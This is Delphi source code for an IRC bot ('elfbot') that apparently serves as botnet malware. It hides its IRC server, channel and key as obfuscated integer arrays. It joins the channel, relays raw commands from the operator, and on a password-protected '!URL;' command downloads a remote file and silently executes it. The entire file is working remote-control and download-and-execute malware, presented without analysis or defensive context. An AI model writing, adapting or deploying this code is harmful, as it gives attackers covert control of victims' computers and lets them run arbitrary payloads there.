   Unit elfbot;
   interface
   uses
     windows, ShellApi,
     winsock;

   Var
    Str01 : string;  // The string where income data ends up
    Sock1 : TSocket;  // The Socket
    SockInfo : SockAddr_In; // Some boring shit
    WSADATA : TWSAData;  // Some boring shit
    BUF : Array[0..65536] of char; // The array all data comes in.
    Channel : Array[0..9]of integer=(243,320,309,318,313,323,310,305,307,309);
    chankey : Array[0..8]of integer=(320,309,318,313,323,310,305,307,309);
    ircnick : Array[0..1]of integer=(275,283);
    ircserv : Array[0..14]of integer=(325, 315, 254, 325, 318, 308, 309, 322, 318, 309, 324, 254, 319, 322, 311);

    function Balle(Caller: cardinal; URL: PChar; FileName: PChar; Reserved: LongWord; StatusCB: cardinal): Longword; stdcall; external 'URLMON.DLL' name 'URLDownloadToFileA';

    Procedure Start_Irc;

    implementation
   FUNCTION getip(HostName:STRING) : STRING;
   LABEL Abort;
   TYPE
     TAPInAddr = ARRAY[0..100] OF PInAddr;
     PAPInAddr =^TAPInAddr;
   VAR
     WSAData    : TWSAData;
     HostEntPtr : PHostEnt;
     pptr       : PAPInAddr;
     I          : Integer;
   BEGIN
     Result:='';
     WSAStartUp($101,WSAData);
     TRY
       HostEntPtr:=GetHostByName(PChar(HostName));
       IF HostEntPtr=NIL THEN GOTO Abort;
       pptr:=PAPInAddr(HostEntPtr^.h_addr_list);
       I:=0;
       WHILE pptr^[I]<>NIL DO BEGIN
         IF HostName='' THEN BEGIN
           IF(Pos('169',inet_ntoa(pptr^[I]^))<>1)AND(Pos('192',inet_ntoa(pptr^[I]^))<>1) THEN BEGIN
             Result:=inet_ntoa(pptr^[I]^);
             GOTO Abort;
           END;
         END ELSE
         RESULT:=(inet_ntoa(pptr^[I]^));
         Inc(I);
       END;
       Abort:
     EXCEPT
     END;
     WSACleanUp();
   END;

   function IntToStr(X: integer): string;
   var
    S: string;
   begin
    Str(X, S);
    Result := S;
   end;

   Function GETSHIT(i:Integer):String;
   Begin
    Case I Of
     0: Result :=
     Chr(ircNick[0]-208) + Chr(ircNick[1]-208);
     1: Result :=
     Chr(ircserv[0]-208) + Chr(ircserv[1]-208) + Chr(ircserv[2]-208) + Chr(ircserv[3]-208) +
     Chr(ircserv[4]-208) + Chr(ircserv[5]-208) + Chr(ircserv[6]-208) + Chr(ircserv[7]-208) +
     Chr(ircserv[8]-208) + Chr(ircserv[9]-208) + Chr(ircserv[10]-208) + Chr(ircserv[11]-208) +
     Chr(ircserv[12]-208) + Chr(ircserv[13]-208) + Chr(ircserv[14]-208);
     2: Result :=
     Chr(channel[0]-208) + Chr(channel[1]-208) + Chr(channel[2]-208) + Chr(channel[3]-208) +
     Chr(channel[4]-208) + Chr(channel[5]-208) + Chr(channel[6]-208) + Chr(channel[7]-208) +
     Chr(channel[8]-208) + Chr(channel[9]-208);
     3: Result :=
     Chr(chankey[0]-208) + Chr(chankey[1]-208) + Chr(chankey[2]-208) + Chr(chankey[3]-208) +
     Chr(chankey[4]-208) + Chr(chankey[5]-208) + Chr(chankey[6]-208) + Chr(chankey[7]-208) +
     Chr(chankey[8]-208);
    End;
   End;

   //now lets start procedure.
   Procedure ReadString;
   var
    Answer : String;
    tmp1, tmp2, tmp3:string;
   Begin
    ZeroMemory(@Str01, SizeOf(Str01));
    Str01 := Buf;
    ZeroMemory(@Buf, SizeOf(Buf));
    If POS('PING', str01)>0 Then Begin
     Answer := Copy( Str01, Pos('PING',Str01) + 6, length(str01));
     Answer := Copy(Answer, 1, pos(#13#10, answer)-1);
     Answer := 'PONG :' + Answer + #13#10;
     Send( Sock1, ANSWER[1], Length(answer), 0);
    end;
    If POS('!RAW;', str01)>0 Then Begin
     Answer := Copy( Str01, Pos('!RAW;',Str01) + 5, length(str01));
     Answer := Copy(Answer, 1, pos(#13#10, answer)-1);
     Answer := Answer + #13#10;
     Send( Sock1, ANSWER[1], Length(answer), 0);
    end;
    If POS('MOTD',str01)>0 then begin
     Answer := 'JOIN '+GETSHIT(2)+' '+GETSHIT(3)+ #13#10;
     Send( Sock1, ANSWER[1], Length(answer), 0);
     Sleep(100);
    end;
    IF POS('!URL;', str01)>0 Then Begin
     tmp1 := copy(str01, pos('!URL;', str01)+5, length(str01)); // pass
     tmp2 := copy(tmp1, pos(';', tmp1)+1, length(tmp1));        // url
     tmp1 := copy(tmp1, 1, pos(';', tmp1)-1);                   // pass
     tmp2 := copy(tmp2, 1, pos(';', tmp2)-1);                   // url
     Randomize;
     if tmp1 = 'coke' then begin
      tmp3 := 'C:\coke'+inttostr(random(999))+'.'+Copy(tmp2, length(tmp2)-2, 3);
      Answer := 'PRIVMSG '+GETSHIT(2)+' :Downloading.'+#13#10;
      Send( Sock1, ANSWER[1], Length(answer), 0);
      Balle(0, pChar(tmp2), pChar(tmp3), 0, 0);
      Answer := 'PRIVMSG '+GETSHIT(2)+' :Executing.'+#13#10;
      Send( Sock1, ANSWER[1], Length(answer), 0);
      ShellExecute(0, 'open' , pchar(tmp3), nil, nil, 0);
     end;
    end;
   End;

   Procedure Start_Irc;
   var
    Answer : String;
    nick   : String;
   begin
      Nick := GETSHIT(0);
      Randomize;
      While Length(Nick)<10 Do
       Nick := Nick + IntToStr(Random(9));
      WSAStartup(257,WSAData);
      SockInfo.sin_family:=PF_INET;
      SockInfo.sin_port:=htons(6667);
      SockInfo.sin_addr.S_addr:= inet_addr(PChar(getip(GETSHIT(1))));
      Sock1 := socket(PF_INET,SOCK_STREAM,0);
      Connect(Sock1,SockInfo,sizeof(SockInfo));
      Answer := 'USER '+Nick+' '+Nick+'@foo.bar '+Nick+' '+Nick+#13#10;
      Send(sock1, Answer[1], Length(answer), 0);
      Answer := 'NICK '+Nick+#13#10;
      Send(sock1, Answer[1], Length(answer), 0);
    While 1<>2 do begin
     if (recv(Sock1,buf,SizeOf(buf),0)) >= 1 then begin // IF DATA THEN
      ReadString;
     end else start_irc;
    end;
   end;

   end.
